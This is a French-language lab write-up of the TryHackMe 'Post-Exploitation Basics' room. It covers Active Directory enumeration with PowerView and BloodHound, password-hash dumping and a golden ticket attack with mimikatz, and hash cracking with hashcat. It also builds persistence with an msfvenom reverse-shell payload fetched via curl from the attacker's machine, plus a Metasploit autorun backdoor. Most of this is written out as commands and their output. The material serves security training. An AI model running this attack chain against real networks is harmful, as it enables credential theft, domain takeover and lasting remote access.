---
tags: [bloodhound, cyber, mimikatz, outil, powerview, todo, tryhackme]
title: TryHackMe - Post-Exploitation Basics
created: '2020-08-12T09:24:42.892Z'
modified: '2020-08-18T19:49:09.801Z'
---

# TryHackMe - Post-Exploitation Basics

- Enumeration post-exploit avec `powerview` et `bloodhound`,
- Dump de hashs et attaques au golden ticket avec `mimikatz`,
- Info gathering avec les outils et logs de `windows server`,
- Maintenir un accès avec des backdoor grâce à `metasploit`.

## Enumeration with Powerview

Cheatsheet : https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Il faut d'abord se connecter en ssh à la machine :

```sh
kali@kali:$ ssh Administrator@10.10.88.118
Administrator@10.10.88.118's password: ********
```

Ce qui nous obtient un accès console :

```sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>
```

On ouvre un powershell en spécifiant `-ep bypass`, ce qui a pour effet de passer outre les règles d'exécution de powershell, ainsi de lancer des scripts plus facilement :

```sh
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>  
```

On lance alors Powerview, qui est déjà présent sur cette machine :

```sh
. .\Downloads\PowerView.ps1
```

Rien ne se passe en apparence mais notre powershell vient d'acquérir de nombreuses commandes supplémentaires. Par exemple, on peut énumérer tous les utilisateurs du domaine :

```sh
PS C:\Users\Administrator> Get-NetUser | select cn 

cn                  
--                  
Administrator
Guest
krbtgt
Machine-1           
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```

Ainsi que les groupes du domaine :

```sh
PS C:\Users\Administrator> Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators
Storage Replica Administrators 
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins 
DnsAdmins
```

Trouvons les répertoires partagés :

```sh
PS C:\Users\Administrator> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```

Et les machines sur le même réseau :

```sh
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem

operatingsystem                         
---------------
Windows Server 2019 Standard Evaluation
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```

## Enumeration with BloodHound

Installons BloodHound et laçons la base de données :

```sh
sudo apt-get install bloodhound
sudo neo4j console
```

Lors du premier lancement, on doit enregistrer un nouveau mot de passe, par défaut les creds sont `neo4j:neo4j`.
Lançons SharpHound sur la victime :

```sh
PS C:\Users\Administrator> powershell -ep bypass
PS C:\Users\Administrator> . .\Downloads\SharpHound.ps1
PS C:\Users\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
-----------------------------------------------
Initializing SharpHound at 4:22 AM on 8/17/2020
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 100 MB RAM
Status: 66 objects finished (+66 66)/s -- Using 105 MB RAM
Enumeration finished in 00:00:01.5347735
Compressing data to C:\Users\Administrator\20200817042237_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 4:22 AM on 8/17/2020! Happy Graphing!
```

Il faut alors récupérer sur notre machine le fichier généré avec scp :

```sh
kali@kali:scp -r -p Administrator@10.10.169.215:'C:\Users\Administrator\20200817042237_loot.zip' loot.zip
```

Lançons Bloodhound :

```sh
kali@kali:~/Documents$ sudo bloodhound
```

Le logiciel s'ouvre, il faut glisser-déposer `loot.zip` dans BloodHound pour importer les données.
Puis, dans le menu dérouland (en haut à droite) cliquer sur `Query`. On peut alors faire des requêtes :

Les domain admins :

- SQLSERVICE@CONTROLLER.LOCAL
- ADMIN2@CONTROLLER.LOCAL
- ADMINISTRATOR@CONTROLLER.LOCAL

Et des users kerberoastables :

- SQLSERVICE@CONTROLLER.LOCAL
- KRBTGT@CONTROLLER.LOCAL

## Dumping hashes with mimikatz

```sh
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>cd Downloads

controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51              
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                               
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                    
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz #
```

Avant tout, on doit s'assurer qu'on lance mimikatz en administrateur :

```sh
mimikatz # privilege::debug 
Privilege '20' OK 
```

### Dump Hashes w/ mimikatz

Il est alors possible de dumper les hashes des mots de passes :

```sh
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)                   
User : Administrator                    
LM   :                                  
NTLM : 2777b7fec870e04dda00cd7260f7bee6 
                                        
RID  : 000001f5 (501)                   
User : Guest                            
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0
```

### Crack those hashes with hashcat

On va utiliser hashcat pour en craquer un. Comme hashcat demande le type du hash à craquer, on recherche à quoi correspond NTLM :

```sh
kali@kali:~$ hashcat --help | grep NTLM      
   5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating System 
```

NTLM est le type 1000, et on note qu'il est le type de hash utilisé pour les systèmes d'exploitations. Passons alors au cracking :

```sh
kali@kali:~/Documents$ hashcat -m 1000 "64f12cddaa88057e06a81b54e73b949b" /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

64f12cddaa88057e06a81b54e73b949b:Password1       
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 64f12cddaa88057e06a81b54e73b949b
Time.Started.....: Mon Aug 17 09:56:12 2020 (0 secs)
Time.Estimated...: Mon Aug 17 09:56:12 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    27042 H/s (0.71ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo
```

Le mot de passe de `Machine1` est donc `Password1` !
De même, celui de `Machine2` est `Password2`.

## Golden Ticket attacks with Mimikatz

Cette attaque vise à dumper le hash et sid de l'utilisateur krbtgt, afin d'obtenir un shell admin sur toutes les machines. On commence par utiliser mimikatz avec les privilèges admin (`privilege::debug` doit retourner `20`) :

### Dump the krbtgt Hash

```sh
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0
    03  71288a6388fb28088a434d3705cc6f2a
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
    05  7902703149b131c57e5253fd9ea710d0
    06  df5ad3cc1ff643663d85dabc81432a81 
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4 
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f 
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066 
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4
```

Pour cette attaque, on doit récupérer le domain : `S-1-5-21-849420856-2351964222-986696166`
L'user : `krbtgt`
Le NTLM primaire : `5508500012cc005cf7082a9a89ebdfdf`

### Create the Golden Ticket

On se crée un golden ticket avec `kerberos::golden /user: /domain: /sid: /krbtgt: /id:` :

```sh
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 8/17/2020 7:16:44 AM ; 8/15/2030 7:16:44 AM ; 8/15/2030 7:16:44 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

### Use the Golden Ticket to access other machine

La commande `misc::cmd` va ouvrir un shell sur toutes les machines :

```sh
mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF690C543B8
```

On pourra alors accéder aux machines en se `ssh` à nouveau sur Administrator, et en choisissant l'une des deux commandes suivantes : `dir \\Desktop-1\c$` ou `PsExec.exe \\Desktop-1 cmd.exe`.

## Enumeration with Server Manager

Comme les serveurs ne sont presque jamais connectés, à moins que ce ne soit pour des raisons de maintenance, cela vous offre un moyen facile de les dénombrer en utilisant uniquement les fonctions intégrées de Windows telles que le gestionnaire de serveur. Si vous disposez déjà d'un administrateur de domaine, vous avez de nombreux accès au gestionnaire de serveur afin de modifier les trusts, d'ajouter ou de supprimer des utilisateurs, d'examiner des groupes, cela peut être un point d'entrée pour trouver d'autres utilisateurs ayant d'autres informations sensibles sur leurs machines ou trouver d'autres utilisateurs sur le réseau de domaine ayant accès à d'autres réseaux afin de basculer vers un autre réseau et de poursuivre vos tests.

La seule façon d'accéder au gestionnaire du serveur est d'entrer en `rdp` dans le serveur .

Nous allons seulement passer en revue les bases telles que l'examen des utilisateurs, des groupes et des trusts, mais il y a beaucoup d'autres méfaits sur lesquels vous pouvez mettre la main en termes de recensement avec le gestionnaire du serveur.

Cela peut également être un moyen de déterminer facilement quel type de pare-feu le réseau utilise, si vous ne l'avez pas encore énuméré.

### Connect to the VM with rdp

Pour se RDP dans la machine :

```sh
kali@kali:~$ rdesktop 10.10.108.178 -u Administrator -p P@$$W0rd -d controller.local -k fr
```

### Enumeration with Server Manager

Naviguez jusqu'à l'onglet `Tools` et sélectionnez `Active Directory Users and Computers`. Cela permettra d'obtenir une liste de tous les utilisateurs du domaine ainsi que d'autres onglets utiles à utiliser tels que les groupes et les ordinateurs.

Certains administrateurs système ne se rendent pas compte qu'en tant qu'attaquant, vous pouvez voir les descriptions des comptes d'utilisateurs. Souvent, les mots de passes se trouvent dans cette description...

Par exemple, `SQL Service` affiche `MYpassword123#` dans sa description.

## Maintaining access

Il existe plusieurs façons de maintenir l'accès à une machine ou à un réseau. Nous allons couvrir une façon assez simple de maintenir l'accès en mettant d'abord en place un shell meterpreter et en utilisant ensuite le module de persistance métasploit qui nous permet de créer un service de porte dérobée dans le système qui nous donnera un shell meterpreter instantané si jamais la machine est arrêtée ou réinitialisée.

Il existe également d'autres moyens de maintenir l'accès, tels que les portes dérobées avancées et les rootkits.

### Generating a Payload w/ msfvenom

Nous voulons utiliser msfvenom pour générer une payload, il faut d'abord trouver son adresse ip (nous utilisons l'interface tun0 avec le vpn tryhackme) :

```sh
kali@kali:~$ ip a | grep inet 
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
    inet6 fe80::a00:27ff:fe23:ff90/64 scope link noprefixroute 
    inet 10.11.7.104/16 brd 10.11.255.255 scope global tun0
    inet6 fe80::4025:6264:3b38:e096/64 scope link stable-privacy
```

L'ip est donc `10.11.7.104`, générons une payload de reverse shell (un meterpreter, plus précisément) sur le port 4444 :

```sh
kali@kali:~/Documents$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.7.104 LPORT=4444 -f exe -o shell.exe
```

Il faut le déplacer sur la machine victime. Pour ça on héberge un serveur web avec `python -m SimpleHTTPServer` :

```sh
kali@kali:~/Documents$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Et on le télécharge avec `curl` :

```sh
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Documents>curl http://10.11.7.104/shell.exe --output shell.exe       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7168  100  7168    0     0   7168      0  0:00:01 --:--:--  0:00:01  148k

controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Documents>dir 
 Volume in drive C has no label. 
 Volume Serial Number is F83F-6346

 Directory of C:\Users\Administrator\Documents
 ```

Le serveur python affiche bien qu'une requête a été effectuée :

```sh
10.10.108.178 - - [17/Aug/2020 12:01:13] "GET /shell.exe HTTP/1.1" 200 -
```

### Run the Persistence Module

Démarrons alors `msfconsole` :

```sh
kali@kali:~/Documents$ sudo msfdb init && sudo msfconsole 
[sudo] password for kali: 
[+] Starting database
...
msf5 > 
```

Déployons le `multi/handler` :

```sh
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.7.104:4444
```

Le handler est à l'écoute, il faut exécuter la payload sur la machine victime :

```sh
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Documents>.\shell.exe
```

Le handler nous donne alors un meterpreter :

```sh
[*] Sending stage (201283 bytes) to 10.10.108.178
[*] Meterpreter session 1 opened (10.11.7.104:4444 -> 10.10.108.178:50220) at 2020-08-17 12:05:49 -0400

meterpreter > 
```

On background la session meterpreter avec `background` et on cherche le module de persistence `exploit/windows/local/persistence` :

```sh
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use exploit/windows/local/persistence
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/persistence) > set session 1
session => 1
msf5 exploit(windows/local/persistence) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/persistence) > exploit

[*] Running persistent module against DOMAIN-CONTROLL via session ID: 1
[+] Persistent VBS script written on DOMAIN-CONTROLL to C:\Users\Administrator\AppData\Local\Temp\QZArSYD.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\yIfGNtdFQ
[+] Installed autorun on DOMAIN-CONTROLL as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\yIfGNtdFQ
[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/DOMAIN-CONTROLL_20200817.0930/DOMAIN-CONTROLL_20200817.0930.rc
```

Par défaut, `persistence` va configurer la victime pour envoyer des requêtes au vers notre machine toutes les 10 secondes. Si l'on n'a pas de meterpreter, le `multi/handler` va envoyer une nouvelle payload pour s'octroyer un shell (il faut bien sûr configurer la payload du handler sur `windows/x64/meterpreter/reverse_tcp`).

Pour démontrer le fonctionnement, on ferme la session que l'on vient de créer :

```sh
msf5 exploit(windows/local/persistence) > sessions 1
[*] Starting interaction with 1...

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.10.108.178 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(windows/local/persistence) > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

Et on relance le multi/handler :

```sh
msf5 > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.7.104:4444
[*] Sending stage (201283 bytes) to 10.10.108.178
[*] Meterpreter session 2 opened (10.11.7.104:4444 -> 10.10.108.178:50220) at 2020-08-17 12:05:49 -0400

meterpreter > 
```

Nous avons bien une deuxième session sans exécuter la payload sur la machine victime, car elle a été automatiquement déclenchée !

## Ressources

- https://blog.harmj0y.net/
- https://adsecurity.org/?page_id=1821
- https://metasploit.help.rapid7.com/docs/about-post-exploitation
- http://www.pentest-standard.org/index.php/Post_Exploitation
- https://offsec.red/mimikatz-cheat-sheet/
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

- https://github.com/gentilkiwi/mimikatz
- https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
